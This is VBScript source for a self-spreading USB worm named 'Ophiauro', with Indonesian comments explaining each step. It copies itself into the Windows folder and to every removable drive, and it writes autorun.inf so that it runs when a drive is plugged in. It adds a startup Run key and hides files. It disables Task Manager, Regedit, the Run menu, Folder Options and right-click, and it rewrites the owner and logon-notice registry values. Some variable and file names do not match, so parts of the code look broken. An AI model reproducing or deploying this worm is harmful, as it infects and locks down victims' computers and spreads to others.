'//--Awal dari kode, set agar ketika terjadi Error dibiarkan dan kemudian lanjutkan kegiatan virus--//
on error resume next

'//--Dim kata-kata berikut ini--//
dim rekur,windowpath,flashdrive,fs,mf,isi,tf,Ophia,nt,check,sd

'//--Set sebuah teks yang nantinya akan dibuat untuk Autorun Setup Information--//
isi = "[autorun]" & vbcrlf & "shellexecute=wscript.exe Ophiu.dll.vbs"
set fs = createobject("Scripting.FileSystemObject")
set mf = fs.getfile(Wscript.ScriptFullname)
dim text,size
size = mf.size
check = mf.drive.drivetype
set text = mf.openastextstream(1,-2)
do while not text.atendofstream
rekur = rekur & text.readline
rekur = rekur & vbcrlf
loop
do

'//--Copy diri untuk menjadi file induk di Windows Path (example: C:\Windows)
Set windowpath = fs.getspecialfolder(0)
set tf = fs.getfile(windowpath & "\batch- Ophia.dll.vbs ")
tf.attributes = 32
set tf=fs.createtextfile(windowpath & "\batch- k4l0n6.dll.vbs",2,true)
tf.write rekursif
tf.close
set tf = fs.getfile(windowpath & "\batch- Ophia.dll.vbs ")
tf.attributes = 39
'//--Buat Atorun.inf untuk menjalankan virus otomatis setiap flash disc tercolok--//
‘Menyebar ke setiap drive yang bertype 1 dan 2(removable) termasuk disket

for each flashdrive in fs.drives
'//--Cek Drive--//
If (flashdrive.drivetype = 1 or flashdrive.drivetype = 2) and flashdrive.path <> "A:" then

'//--Buat Infector jika ternyata Drivetypr 1 atau 2. Atau A:\--//
set tf=fs.getfile(flashdrive.path &"\Ophia.vbs ")
tf.attributes =32
set tf=fs.createtextfile(flashdrive.path &"\Ophia.dll.vbs ",2,true)
tf.write rekursif
tf.close
set tf=fs.getfile(flashdrive.path &"\Ophia.dll.vbs ")
tf.attributes = 39

'//--Buat Atorun.inf yang teks-nya tadi sudah disiapkan (Auto Setup Information)--//
set tf =fs.getfile(flashdrive.path &"\autorun.inf")
tf.attributes = 32
set tf=fs.createtextfile(flashdrive.path &"\autorun.inf",2,true)
tf.write isi
tf.close
set tf = fs.getfile(flashdrive.path &"\autorun.inf")
tf.attributes=39
end if
next

'//--Manipulasi Registry--//

set kalong = createobject("WScript.Shell")

'//--Manip - Ubah Title Internet Explorer menjadi THE KALONG v.s. ZAY--//
kalong.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Window Title"," Ophiauro "

'//--Manip – Set agar file hidden tidak ditampilkan di Explorer--//
kalong.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Advanced\Hidden", "0", "REG_DWORD"

'//--Manip – Hilangkan menu Find, Folder Options, Run, dan memblokir Regedit dan Task Manager--//
kalong.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoFind", "1", "REG_DWORD"
kalong.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoFolderOptions", "1", "REG_DWORD"
kalong.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoRun", "1", "REG_DWORD"
kalong.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools", "1", "REG_DWORD"
kalong.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr", "1", "REG_DWORD"

'//--Manip – Disable klik kanan--//
kalong.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoViewContextMenu", "1", "REG_DWORD"

'//--Manip - Munculkan Pesan Setiap Windows Startup--//
kalong.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Winlogon\LegalNoticeCaption", "Ophiauro. Variant from Rangga-Zay, don’t panic all data are safe."

'//--Manip – Aktif setiap Windows Startup--//
kalong.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Systemdir", windowpath & "\batch- Ophia.dll.vbs "

'//--Manip – Ubah RegisteredOwner dan Organization--//
kalong.regwrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\RegisteredOrganization", "The Polip"
kalong.regwrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\RegisteredOwner","Threads"

'//--Nah kalau kode dibawah ini saya nggak tau, Please jelaskan--//
if check <> 1 then
Wscript.sleep 200000
end if
loop while check <> 1
set sd = createobject("Wscript.shell")
sd.run windowpath & "\explorer.exe /e,/select, " & Wscript.ScriptFullname
'Akhir dari Kode